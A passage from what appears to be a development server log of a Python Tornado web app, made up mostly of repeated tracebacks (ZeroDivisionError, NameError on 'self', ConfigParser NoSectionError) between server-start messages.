__utmb=188782963.15.10.1348592875; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/learn.py", line 165, in on_success
    html = self.render_string("ui-modules/complete-video.html", clip=solution_clip_name, score=score, accuracy=score/clicks)
ZeroDivisionError: integer division or modulo by zero
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 171.98ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user George Eracleous has successfully logged in.
INFO:intheory-8001:Facebook user George Eracleous has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    Traceback (most recent call last):
class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 23, in <module>
    class UserLoginHandler(base.BaseHandler, tornado.auth.FacebookGraphMixin):
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 27, in UserLoginHandler
    if  self.env == "prod":
NameError: name 'self' is not defined
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
dev
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
        self.log.debug(env)
self.log.debug(env)
NameErrorNameError: : name 'self' is not definedname 'self' is not defined

Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
  File "/www/virtualenv/intheory/src/app.py", line 105, in <module>
    self.log.debug(env)
NameError: name 'self' is not defined
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:405 HEAD / (127.0.0.1) 1.90ms
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Server started successfully.
dev
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
Traceback (most recent call last):
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
  File "/usr/lib/python2.7/ConfigParser.py", line 330, in get
    raise NoSectionError(section)
ConfigParser.NoSectionError: No section: False
  File "/www/virtualenv/intheory/src/app.py", line 109, in <module>
    Intheory(env, port, config_file).listen(port)
  File "/www/virtualenv/intheory/src/app.py", line 50, in __init__
    db_host = config.get(env, "db_host") or "localhost"
